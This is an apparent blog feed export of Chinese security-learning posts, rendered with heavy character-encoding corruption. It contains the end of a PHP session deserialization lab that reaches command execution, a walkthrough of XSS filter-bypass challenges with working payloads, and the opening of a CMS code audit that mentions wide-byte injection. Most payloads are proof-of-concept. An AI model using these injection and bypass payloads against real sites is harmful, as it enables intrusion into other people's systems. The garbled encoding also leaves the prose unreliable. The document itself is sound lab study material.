è®¾ç½®è¯¥ç›®å½•ä¸‹ï¼Œä½¿ç”¨php_serializeå¤„ç†å™¨</span><br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¯¥æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª<code>PHPSESSID</code>æ–‡ä»¶ï¼Œä¼ å…¥<code>$a = |O:4:&quot;test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/28.png"></p><p>okï¼Œå†ç”¨<code>php</code>å¤„ç†å™¨å»è¯»å–è¿™ä¸ª<code>PHPSESSID</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># demo2.php</span><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Session unserialize!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        system(<span class="hljs-keyword">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/29.png"></p><p>æ€»ç»“ä¸€ä¸‹ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ª<code>ç«–çº¿ï¼ˆ|ï¼‰</code>ï¼Œå› ä¸º<code>php</code>å¤„ç†å™¨ä¼šè¯»å–<code>ç«–çº¿ï¼ˆ|ï¼‰</code>åé¢çš„å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–</p><h5 id="Session-ä¸Šä¼ è¿›åº¦"><a href="#Session-ä¸Šä¼ è¿›åº¦" class="headerlink" title="Session ä¸Šä¼ è¿›åº¦"></a>Session ä¸Šä¼ è¿›åº¦</h5><p>æ­¤ç‰¹æ€§è‡ª PHP 5.4.0 åå¯ç”¨</p><blockquote><p>å½“ <code>session.upload_progress.enabled</code>  INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€</p><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<code>$_SESSION</code>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<code>$_SESSION</code>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ <code>session.upload_progress.prefix</code>ä¸ <code>session.upload_progress.name</code>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p></blockquote><p>ç¿»è¯‘ä¸€ä¸‹ï¼Œå½“<code>php.ini</code>ä¸­å¼€å¯äº†<code>session.upload_progress.enabled</code>  æ—¶ï¼Œå¦‚æœåœ¨<code>POST</code>è¯·æ±‚ä¸­æ’å…¥ä¸€ä¸ªä¸<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œå°±ä¼šæŠŠä¸Šä¼ çš„è¿›åº¦æ”¾åœ¨<code>$_SESSION</code>æ•°ç»„ä¸­</p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/30.png"></p><p>è¿™é‡Œå…ˆæµ…æµ…ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹ä¸Šä¼ åå­˜å‚¨çš„<code>PHPSESSID</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;form action=&quot;index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;test&quot;/&gt;<br>    &lt;!--æ³¨æ„nameçš„å€¼è¦ä¸é…ç½®æ–‡ä»¶ä¸­çš„ç›¸åŒ--&gt;<br>    &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;<br>    &lt;input type=&quot;submit&quot;/&gt;<br>&lt;/form&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/31.png"></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/32.png"></p><p>å‘ç°è¿™ä¸¤ä¸ªå¯æ§çš„å‚æ•°ï¼Œå†æ¥çœ‹ä¸€ä¸‹<code>PHPSESSID</code>æ–‡ä»¶(è¿™é‡Œæœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œå½“<code>name=1.png</code>æ—¶ï¼Œç”Ÿæˆçš„<code>PHPSESSID</code>æ–‡ä»¶æ˜¯ç©ºçš„)</p><p>è¿™é‡Œé‡å¤ä¸€ä¸‹ä¸Šé¢çš„æ“ä½œï¼Œä¼ å…¥<code>name=|O:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;upload_progress_xxx&quot;</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;start_time&quot;</span>;i:<span class="hljs-number">1657036095</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;content_length&quot;</span>;i:<span class="hljs-number">55380</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;bytes_processed&quot;</span>;i:<span class="hljs-number">55380</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;done&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;files&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">7</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;field_name&quot;</span>;s:<span class="hljs-number">38</span>:<span class="hljs-string">&quot;|O:4:&quot;</span>test<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:4:&quot;</span>flag<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">// ä¼ å…¥çš„pocæˆåŠŸå†™å…¥åˆ°æ–‡ä»¶ä¹‹ä¸­</span><br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><ul><li>å‡å¦‚ä¸Šä¼ æ—¶ä½¿ç”¨çš„<code>php_serialize</code>å¤„ç†å™¨å»åºåˆ—åŒ–<code>$_SESSION</code>ä¸­çš„æ•°æ®å¹¶å­˜å‚¨åˆ°<code>PHPSESSION</code>æ–‡ä»¶ä¸­å»</li><li>å½“å†å¯¹<code>PHPSESSION</code>æ–‡ä»¶è¿›è¡Œè¯»å–æ—¶ï¼Œä½¿ç”¨<code>php</code>å¤„ç†å™¨å»ååºåˆ—åŒ–<code>PHPSESSION</code>æ–‡ä»¶</li><li><code>php</code>å¤„ç†å™¨ä¼šå¯»æ‰¾<code>ç«–çº¿ï¼ˆ|ï¼‰</code>åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–æ“ä½œ</li><li>æ­¤æ—¶å°±ä¸<code>session</code>çš„ååºåˆ—åŒ–ç›¸åŒ</li></ul><h3 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h3><p>æ€»ç»“ä¸‹æ¥ï¼Œè¿˜æ˜¯ä¸€ä¸ªå­—â€èœä»–å¦ˆç»™èœå¼€é—¨ï¼Œèœåˆ°å®¶äº†â€ï¼ŒæŒ‰ç…§è‡ªå·±çš„é¢„è®¡æƒ…å†µï¼Œè¿™ç¯‡æ–‡ç« åº”è¯¥å®Œæˆçš„å¾ˆå¿«ï¼Œä½†å®é™…æƒ…å†µæ˜¯ï¼Œçœ‹ä¸€ä¼šå¡ä¸€ä¼šï¼Œæˆ–æ˜¯çœ‹ä¸€ä¼šå¡å¾ˆä¹…ï¼Œä¹Ÿä¸çŸ¥é“æ¥ä¸‹æ¥èƒ½ä¸èƒ½ç»§ç»­æ··å£é¥­åƒäº†</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/33.png" style="zoom:67%;"><h3 id="0x04-å‚è€ƒé“¾æ¥"><a href="#0x04-å‚è€ƒé“¾æ¥" class="headerlink" title="0x04 å‚è€ƒé“¾æ¥"></a>0x04 å‚è€ƒé“¾æ¥</h3><p><a href="https://github.com/fine-1/php-SER-libs">https://github.com/fine-1/php-SER-libs</a></p><p><a href="https://xz.aliyun.com/t/9293#toc-9">https://xz.aliyun.com/t/9293#toc-9</a></p><p><a href="https://www.php.net/manual/zh/soapclient.call.php">https://www.php.net/manual/zh/soapclient.call.php</a></p><p><a href="https://article.itxueyuan.com/nWEn9q">https://article.itxueyuan.com/nWEn9q</a></p><p><a href="http://t.zoukankan.com/tr1ple-p-11156279.html">http://t.zoukankan.com/tr1ple-p-11156279.html</a></p><p><a href="https://blog.csdn.net/qq_51295677/article/details/123486896">https://blog.csdn.net/qq_51295677/article/details/123486896</a></p><p><a href="https://www.jb51.net/article/242523.htm">https://www.jb51.net/article/242523.htm</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-491289.html">https://www.php.cn/php-weizijiaocheng-491289.html</a></p><p><a href="https://blog.csdn.net/xiaolong22333/article/details/116092578">https://blog.csdn.net/xiaolong22333/article/details/116092578</a></p><p><a href="https://paper.seebug.org/680/#22-demo">https://paper.seebug.org/680/#22-demo</a></p><p><a href="https://www.php.net/manual/en/class.phar.php">https://www.php.net/manual/en/class.phar.php</a></p><p><a href="https://blog.csdn.net/Askshhbs/article/details/124404971">https://blog.csdn.net/Askshhbs/article/details/124404971</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_bypassé¶åœº</title>
    <link href="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS-bypassé¶åœº"><a href="#XSS-bypassé¶åœº" class="headerlink" title="XSS bypassé¶åœº"></a>XSS bypassé¶åœº</h3><h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å¶ç„¶æ—¶é—´çœ‹åˆ°ä¸€ä¸ªxss bypassçš„é¶åœºï¼Œå› ä¸ºæ­£åœ¨å¯¹ä¸€ä¸ªxssçš„è¿‡æ»¤è§„åˆ™è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥é¡ºæ‰‹ç©äº†ä¸€ä¸‹ï¼Œæ•…è®°å½•ä¸€æ‰‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/moeinfatehi/xss_vulnerability_challenges// é¡¹ç›®åœ°å€<br></code></pre></td></tr></table></figure><h4 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h4><p>è¿™å…³æ²¡ä»€ä¹ˆï¼Œå‰ç«¯jsçš„é™åˆ¶ï¼Œå¯ä»¥ç¦ç”¨æ‰æµè§ˆå™¨çš„jsï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…è¿‡ï¼Œä½†ä¸ªäººæ¨èè¿˜æ˜¯ç›´æ¥æŠ“åŒ…è¿‡ï¼Œå› ä¸ºç¦ç”¨jsçš„è¯å¯èƒ½ä¼šå¯¼è‡´é¡µé¢åŠ è½½å‡ºç°ä¸€äº›å°é—®é¢˜</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h4><p>è¿™ä¸€å…³å°±æ˜¯ç®€å•çš„è¿›è¡Œæ„é€ ä¸€ä¸‹æ ‡ç­¾</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/2.png"></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥åœ¨<code>input</code>æ ‡ç­¾ä¸­ä½“ç°å‡ºæ¥ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ <code>payload</code>:<code>11&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/3.png"></p><h4 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h4><p>è¿™ä¸€å…³è€ƒçš„åº”è¯¥æ˜¯jsçš„åŸºç¡€ï¼Œé¦–å…ˆè¾“å…¥ä¸ª111</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/4.png"></p><p>æŸ¥çœ‹ç½‘é¡µæºç èƒ½å¤Ÿå‘ç°è¿™ä¸ª<code>111</code>è¢«å­˜å‚¨ä¸ºå˜é‡nameçš„å€¼</p><p>ä½†å¯ä»¥å°†è¿™ä¸ªå£°æ˜å˜é‡çš„è¯­å¥è¿›è¡Œé—­åˆï¼Œç„¶åç›´æ¥æ‰§è¡Œ<code>payload</code>:<code>111&quot;;alert(/xxx/);//</code></p><p>æ³¨æ„éœ€è¦æ³¨é‡Š</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/5.png"></p><p>å½“å‰ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸€äº›å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚<code>eval()</code>ã€<code>new Function()</code>ç­‰</p><p><code>alert(/xxx/)&quot;;eval(name);//</code></p><h4 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h4><p>è¿™å…³ï¼Œå·²ç»ç›´ç™½çš„è¯´äº†ä¸èƒ½ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œé‚£å°±æ¢ä¸ªæ ‡ç­¾ï¼Œç„¶åå°±æ˜¯å‰ç«¯é™åˆ¶äº†ï¼Œæ²¡å•¥çš„</p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="XSS5"><a href="#XSS5" class="headerlink" title="XSS5"></a>XSS5</h4><p>è¿™å…³ç¦ç”¨äº†<code>&lt; &gt;</code>ï¼Œç¦ç”¨äº†å°–æ‹¬å·å°±ä¸å¥½æ„é€ æ ‡ç­¾äº†ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨ç¼–ç ï¼Œä¼˜å…ˆæƒ³åˆ°çš„å°±æ˜¯urlç¼–ç </p><p>æŠŠå°–æ‹¬å·æ›´æ”¹ä¸ºurlç¼–ç çš„å½¢å¼ï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è¿‡äº†</p><p><code>payload</code>:<code>111&quot; onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="XSS6"><a href="#XSS6" class="headerlink" title="XSS6"></a>XSS6</h4><p>è¿™å…³è¿‡æ»¤äº†åŒå¼•å·<code>&quot;</code></p><p>ä½†å¥½åƒæ²¡å¤ªç†è§£ä½œè€…çš„æ„æ€ï¼Œè¾“å…¥åŒå¼•å·ä¹‹åï¼Œä¼šè¿›è¡Œè½¬ä¹‰ï¼Œå˜æˆ<code>\&quot;</code>ï¼Œè€ŒåŒå¼•å·åˆèƒ½å¤Ÿæ­£å¸¸è¿›è¡ŒåŠ è½½æ‰§è¡Œ</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥<code>111&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss6æºç </span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);</span><br>    <span class="hljs-variable">$input</span> = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// Failure is an option</span><br>    <span class="hljs-comment">// Bypasses double encoding attacks</span><br>    <span class="hljs-comment">// &lt;script&gt;alert(0)&lt;/script&gt;</span><br>    <span class="hljs-comment">// %3Cscript%3Ealert%280%29%3C%2Fscript%3E</span><br>    <span class="hljs-comment">// %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E</span><br>    <span class="hljs-variable">$input</span> = urldecode(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„Ÿè§‰æœ‰ç‚¹å‡ºä¹ä½œè€…çš„æƒ³æ³•ï¼Œçœ‹æ ·å­ä½œè€…æœ¬èº«æ˜¯æƒ³è¦è®©ä½¿ç”¨ç¼–ç æˆ–è€…ä¸€äº›æ²¡æœ‰åŒå¼•å·çš„<code>payload</code>æ¥è¿‡è¿™é‡Œï¼Œç»“æœä¸æ›¾æƒ³åŒå¼•å·æ˜¯èƒ½å¤Ÿç›´æ¥åŠ è½½æˆåŠŸçš„ğŸ¤£</p><h4 id="XSS7"><a href="#XSS7" class="headerlink" title="XSS7"></a>XSS7</h4><p>è¿™å…³è¿‡æ»¤äº†åŒå¼•å·ï¼Œä¸€å¯¹å°–æ‹¬å·ï¼Œç›´æ¥è¾“å…¥çš„è¯ä¼šè¿”å›htmlå®ä½“åŒ–ç¼–ç çš„å½¢å¼ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç›´æ¥ç”¨urlç¼–ç è¿‡</p><p><code>payload</code>:<code>111%22 onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/9.png"></p><h4 id="XSS8"><a href="#XSS8" class="headerlink" title="XSS8"></a>XSS8</h4><p>è¿™å…³ç›´æ¥æ‘†æ˜ï¼Œç”¨çš„<code>htmlentities()</code>ç¨ç¨çœ‹ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss8æºç </span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> htmlentities(<span class="hljs-variable">$data</span>, ENT_QUOTES);<span class="hljs-comment"># ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚</span><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmmğŸ˜­ï¼Œè¿™ä¸ªæˆ‘è§‰ç€å¾ˆå®‰å…¨</p><p>æ²¡æœ‰ç»å¯¹çš„å®‰å…¨ï¼Œå…¶å®å°±æ˜¯èœ</p><img src="/2022/03/05/xss-bypass%E9%9D%B6%E5%9C%BA/10.png" style="zoom:60%;">]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡-AACMS</title>
    <link href="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/"/>
    <url>/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡å®¡cmså§ï¼Œå‚è€ƒå­¦ä¹ äº†è¿™ä½å¤§å“¥çš„æ€è·¯ï¼Œæ•…è®°å½•ä¸€ä¸‹ï¼Œemmmï¼Œèœé¸¡çš„æˆ‘è¿˜ä¸é…è‡ªå·±å»å®¡ï¼Œåªèƒ½å…ˆæ‰¾æ–‡ç« ä¸€è¾¹å‚è€ƒå­¦ä¹ ä¸€è¾¹å®¡ã€‚</p><h4 id="å®¡è®¡è¿‡ç¨‹"><a href="#å®¡è®¡è¿‡ç¨‹" class="headerlink" title="å®¡è®¡è¿‡ç¨‹"></a>å®¡è®¡è¿‡ç¨‹</h4><h5 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h5><p>PHP5.2.17</p><p>MySQL5.7.26</p><p>Apache2.4.39</p><h5 id="ç¨‹åºå®‰è£…"><a href="#ç¨‹åºå®‰è£…" class="headerlink" title="ç¨‹åºå®‰è£…"></a>ç¨‹åºå®‰è£…</h5><p>å…ˆå¤§è‡´æµè§ˆä¸‹è¯¥cmsçš„ç›®å½•ç»“æ„ï¼Œä¸‰ä¸ªå…¥å£å‡½æ•°ï¼Œå…¶ä»–çš„åŸºæœ¬ä¸Šå¦‚å›¾æ‰€æè¿°çš„é‚£æ ·ã€‚</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png"></p><p>å®‰è£…è¯¥cmsï¼Œé…ç½®å¥½ç½‘ç«™ä¹‹åç›´æ¥è®¿é—®/install/index.phpå³å¯ï¼Œæœ‰ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæ•°æ®åº“é»˜è®¤å­—ç¬¦é›†ä¸ºGBKï¼Œè¿™å°±å¯èƒ½å¯¼è‡´å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png"></p><h5 id="å…¥å£å‡½æ•°åˆ†æ"><a href="#å…¥å£å‡½æ•°åˆ†æ" class="headerlink" title="å…¥å£å‡½æ•°åˆ†æ"></a>å…¥å£å‡½æ•°åˆ†æ</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png"></p><p>å…ˆåŒ…å«class_core.phpï¼Œç„¶åè°ƒç”¨è¯¥æ–‡ä»¶ä¸­çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œæœ€ååŒ…å«æ–‡ç« æ¨¡æ¿ç›®å½•ä¸‹çš„indexæ–‡ä»¶</p><p>è·Ÿè¿›class_core.phpæ–‡ä»¶æŸ¥çœ‹ï¼Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ªå¸¸é‡ï¼Œåå®šä¹‰äº†äº”ä¸ªç±»ï¼Œæ‰¾åˆ°åˆšåˆšindex.phpä¸­è°ƒç”¨çš„æ–¹æ³•</p><p><img src="/2022/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// å®ä¾‹åŒ–äº†è‡ªå·±æœ¬èº«çš„å¯¹è±¡ï¼šå•ä¾‹æ¨¡å¼</span><br><span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†çœ‹<code>init()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// è°ƒç”¨è¯¥ç±»ä¸­çš„ä¸€äº›å…¶ä»–æ–¹æ³•</span><br><br><span class="hljs-keyword">$this</span>-&gt;_init_db();<br><span class="hljs-keyword">$this</span>-&gt;_init_memory();<br><span 